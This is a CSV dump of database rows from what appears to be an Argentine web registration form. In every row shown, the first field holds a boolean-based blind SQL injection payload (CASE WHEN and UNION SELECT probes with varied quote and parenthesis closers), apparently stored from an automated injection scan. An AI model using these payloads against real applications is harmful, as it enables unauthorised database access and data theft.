214288,"asadsd) WHERE 3759=3759 AND 7827=(SELECT (CASE WHEN (7827=7827) THEN 7827 ELSE (SELECT 8491 UNION SELECT 4707) END))-- MkyX","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214289,"asadsd' WHERE 6089=6089 AND 9742=(SELECT (CASE WHEN (9742=6206) THEN 9742 ELSE (SELECT 6206 UNION SELECT 1960) END))-- oEGg","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214290,"asadsd' WHERE 5876=5876 AND 7827=(SELECT (CASE WHEN (7827=7827) THEN 7827 ELSE (SELECT 8491 UNION SELECT 4707) END))-- qlbv","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214291,"asadsd"" WHERE 3278=3278 AND 9749=(SELECT (CASE WHEN (9749=4160) THEN 9749 ELSE (SELECT 4160 UNION SELECT 2247) END))-- NmQV","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214292,"asadsd"" WHERE 8121=8121 AND 7827=(SELECT (CASE WHEN (7827=7827) THEN 7827 ELSE (SELECT 8491 UNION SELECT 4707) END))-- KgWc","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214293,"asadsd WHERE 3212=3212 AND 7530=(SELECT (CASE WHEN (7530=7913) THEN 7530 ELSE (SELECT 7913 UNION SELECT 1762) END))-- yiSI","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214294,"asadsd WHERE 5793=5793 AND 7827=(SELECT (CASE WHEN (7827=7827) THEN 7827 ELSE (SELECT 8491 UNION SELECT 4707) END))-- oNFM","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214295,"asadsd'||(SELECT Gtaw WHERE 6708=6708 AND 6755=(SELECT (CASE WHEN (6755=4010) THEN 6755 ELSE (SELECT 4010 UNION SELECT 6008) END))-- cXMR","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214296,"asadsd'||(SELECT nzfV WHERE 7904=7904 AND 7827=(SELECT (CASE WHEN (7827=7827) THEN 7827 ELSE (SELECT 8491 UNION SELECT 4707) END))-- rEOe","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214297,"asadsd'||(SELECT rjsA FROM DUAL WHERE 8939=8939 AND 3883=(SELECT (CASE WHEN (3883=7907) THEN 3883 ELSE (SELECT 7907 UNION SELECT 6386) END))-- ovHx","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214298,"asadsd'||(SELECT lmMi FROM DUAL WHERE 1578=1578 AND 7827=(SELECT (CASE WHEN (7827=7827) THEN 7827 ELSE (SELECT 8491 UNION SELECT 4707) END))-- qUrd","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214299,"asadsd'+(SELECT zzhg WHERE 9858=9858 AND 7912=(SELECT (CASE WHEN (7912=8735) THEN 7912 ELSE (SELECT 8735 UNION SELECT 5289) END))-- IyFh","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214300,"asadsd'+(SELECT UoWW WHERE 9512=9512 AND 7827=(SELECT (CASE WHEN (7827=7827) THEN 7827 ELSE (SELECT 8491 UNION SELECT 4707) END))-- rZTa","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214301,"asadsd||(SELECT PzCy FROM DUAL WHERE 9205=9205 AND 4587=(SELECT (CASE WHEN (4587=2691) THEN 4587 ELSE (SELECT 2691 UNION SELECT 7943) END))-- lWPF","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214302,"asadsd||(SELECT EgmP FROM DUAL WHERE 8846=8846 AND 7827=(SELECT (CASE WHEN (7827=7827) THEN 7827 ELSE (SELECT 8491 UNION SELECT 4707) END))-- HhVr","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214303,"asadsd||(SELECT TQgQ WHERE 4849=4849 AND 6693=(SELECT (CASE WHEN (6693=2342) THEN 6693 ELSE (SELECT 2342 UNION SELECT 3849) END))-- IMQd","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214304,"asadsd||(SELECT TvnB WHERE 5753=5753 AND 7827=(SELECT (CASE WHEN (7827=7827) THEN 7827 ELSE (SELECT 8491 UNION SELECT 4707) END))-- rETK","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214305,"asadsd+(SELECT FUBA WHERE 2236=2236 AND 7549=(SELECT (CASE WHEN (7549=5407) THEN 7549 ELSE (SELECT 5407 UNION SELECT 2409) END))-- NtYN","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214306,"asadsd+(SELECT HOaP WHERE 6923=6923 AND 7827=(SELECT (CASE WHEN (7827=7827) THEN 7827 ELSE (SELECT 8491 UNION SELECT 4707) END))-- nWDO","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214307,"asadsd')) AS eXgB WHERE 1095=1095 AND 8799=(SELECT (CASE WHEN (8799=4327) THEN 8799 ELSE (SELECT 4327 UNION SELECT 8239) END))-- clDt","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214308,"asadsd')) AS ekap WHERE 4656=4656 AND 7827=(SELECT (CASE WHEN (7827=7827) THEN 7827 ELSE (SELECT 8491 UNION SELECT 4707) END))-- EWUz","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214309,"asadsd"")) AS ZcCB WHERE 7910=7910 AND 5787=(SELECT (CASE WHEN (5787=3866) THEN 5787 ELSE (SELECT 3866 UNION SELECT 8499) END))-- ejZY","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214310,"asadsd"")) AS UOKY WHERE 6614=6614 AND 7827=(SELECT (CASE WHEN (7827=7827) THEN 7827 ELSE (SELECT 8491 UNION SELECT 4707) END))-- oOFe","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214311,"asadsd)) AS QGkL WHERE 3650=3650 AND 8822=(SELECT (CASE WHEN (8822=3120) THEN 8822 ELSE (SELECT 3120 UNION SELECT 3280) END))-- pPyM","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214312,"asadsd)) AS msLE WHERE 9809=9809 AND 7827=(SELECT (CASE WHEN (7827=7827) THEN 7827 ELSE (SELECT 8491 UNION SELECT 4707) END))-- iCXP","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214313,"asadsd') AS CiHQ WHERE 1613=1613 AND 1564=(SELECT (CASE WHEN (1564=4703) THEN 1564 ELSE (SELECT 4703 UNION SELECT 6506) END))-- XcLB","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214314,"asadsd') AS ZkJl WHERE 2881=2881 AND 7827=(SELECT (CASE WHEN (7827=7827) THEN 7827 ELSE (SELECT 8491 UNION SELECT 4707) END))-- TKBZ","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214315,"asadsd"") AS Vxwj WHERE 5573=5573 AND 7077=(SELECT (CASE WHEN (7077=6115) THEN 7077 ELSE (SELECT 6115 UNION SELECT 3548) END))-- EjOa","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214316,"asadsd"") AS HIFZ WHERE 3385=3385 AND 7827=(SELECT (CASE WHEN (7827=7827) THEN 7827 ELSE (SELECT 8491 UNION SELECT 4707) END))-- IZXk","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214317,"asadsd) AS gaRp WHERE 9284=9284 AND 2588=(SELECT (CASE WHEN (2588=5123) THEN 2588 ELSE (SELECT 5123 UNION SELECT 4538) END))-- Mhds","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214318,"asadsd) AS HIsl WHERE 5782=5782 AND 7827=(SELECT (CASE WHEN (7827=7827) THEN 7827 ELSE (SELECT 8491 UNION SELECT 4707) END))-- Lahi","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214319,"asadsd` WHERE 1816=1816 AND 2034=(SELECT (CASE WHEN (2034=1742) THEN 2034 ELSE (SELECT 1742 UNION SELECT 2123) END))-- mmFN","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214320,"asadsd` WHERE 4879=4879 AND 7827=(SELECT (CASE WHEN (7827=7827) THEN 7827 ELSE (SELECT 8491 UNION SELECT 4707) END))-- OlXT","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214321,"asadsd`) WHERE 1604=1604 AND 1461=(SELECT (CASE WHEN (1461=9374) THEN 1461 ELSE (SELECT 9374 UNION SELECT 9295) END))-- lJvo","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214322,"asadsd`) WHERE 8955=8955 AND 7827=(SELECT (CASE WHEN (7827=7827) THEN 7827 ELSE (SELECT 8491 UNION SELECT 4707) END))-- OyAO","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214323,"asadsd`=`asadsd` AND 6937=(SELECT (CASE WHEN (6937=9376) THEN 6937 ELSE (SELECT 9376 UNION SELECT 3252) END))-- miJf","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214324,"asadsd`=`asadsd` AND 7827=(SELECT (CASE WHEN (7827=7827) THEN 7827 ELSE (SELECT 8491 UNION SELECT 4707) END))-- oYOd","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214325,"asadsd""=""asadsd"" AND 3921=(SELECT (CASE WHEN (3921=2883) THEN 3921 ELSE (SELECT 2883 UNION SELECT 4321) END))-- ghHI","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214326,"asadsd""=""asadsd"" AND 7827=(SELECT (CASE WHEN (7827=7827) THEN 7827 ELSE (SELECT 8491 UNION SELECT 4707) END))-- pUec","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214327,"asadsd]-(SELECT 0 WHERE 5123=5123 AND 6080=(SELECT (CASE WHEN (6080=5708) THEN 6080 ELSE (SELECT 5708 UNION SELECT 9236) END))-- tipS","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214328,"asadsd]-(SELECT 0 WHERE 5069=5069 AND 7827=(SELECT (CASE WHEN (7827=7827) THEN 7827 ELSE (SELECT 8491 UNION SELECT 4707) END))-- YucW","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214329,"asadsd' IN BOOLEAN MODE) AND 6457=(SELECT (CASE WHEN (6457=3421) THEN 6457 ELSE (SELECT 3421 UNION SELECT 6241) END))-- gtwn","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214330,"asadsd' IN BOOLEAN MODE) AND 7827=(SELECT (CASE WHEN (7827=7827) THEN 7827 ELSE (SELECT 8491 UNION SELECT 4707) END))-- Stfp","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214331,"-9554) OR 8626=(SELECT (CASE WHEN (8626=7903) THEN 8626 ELSE (SELECT 7903 UNION SELECT 6881) END))-- hybl","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214332,"-5264) OR 7570=(SELECT (CASE WHEN (7570=7570) THEN 7570 ELSE (SELECT 6460 UNION SELECT 2817) END))-- KkDe","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214333,"-1855') OR 7884=(SELECT (CASE WHEN (7884=7775) THEN 7884 ELSE (SELECT 7775 UNION SELECT 3762) END))-- xlnq","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214334,"-5362') OR 7570=(SELECT (CASE WHEN (7570=7570) THEN 7570 ELSE (SELECT 6460 UNION SELECT 2817) END))-- BYeZ","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214335,"-3361' OR 4986=(SELECT (CASE WHEN (4986=8039) THEN 4986 ELSE (SELECT 8039 UNION SELECT 2676) END))-- oTsx","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214336,"-3977' OR 7570=(SELECT (CASE WHEN (7570=7570) THEN 7570 ELSE (SELECT 6460 UNION SELECT 2817) END))-- CkLa","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214337,"-7892"" OR 7051=(SELECT (CASE WHEN (7051=9362) THEN 7051 ELSE (SELECT 9362 UNION SELECT 7138) END))-- BZqR","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214338,"-2645"" OR 7570=(SELECT (CASE WHEN (7570=7570) THEN 7570 ELSE (SELECT 6460 UNION SELECT 2817) END))-- xIXi","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214339,"-5056)) OR 5448=(SELECT (CASE WHEN (5448=5998) THEN 5448 ELSE (SELECT 5998 UNION SELECT 1252) END))-- Dxmp","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214340,"-8433)) OR 7570=(SELECT (CASE WHEN (7570=7570) THEN 7570 ELSE (SELECT 6460 UNION SELECT 2817) END))-- MJGr","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214341,"-9277))) OR 5846=(SELECT (CASE WHEN (5846=4394) THEN 5846 ELSE (SELECT 4394 UNION SELECT 7781) END))-- HEUM","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214342,"-6307))) OR 7570=(SELECT (CASE WHEN (7570=7570) THEN 7570 ELSE (SELECT 6460 UNION SELECT 2817) END))-- Dprr","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214343,"-9195 OR 7835=(SELECT (CASE WHEN (7835=1397) THEN 7835 ELSE (SELECT 1397 UNION SELECT 7000) END))-- kbZL","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
214344,"-3846 OR 7570=(SELECT (CASE WHEN (7570=7570) THEN 7570 ELSE (SELECT 6460 UNION SELECT 2817) END))-- KFaK","Dependiente de FFAA/Seguridad",asd,,,,,"Buenos Aires",,"Buenos Aires",,0,,,,,,,NO,NO,NO,NO,NO,NO,NO,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,NO,NO,NO,NO,NO,NO,vida,vida@mail.com,22234433333
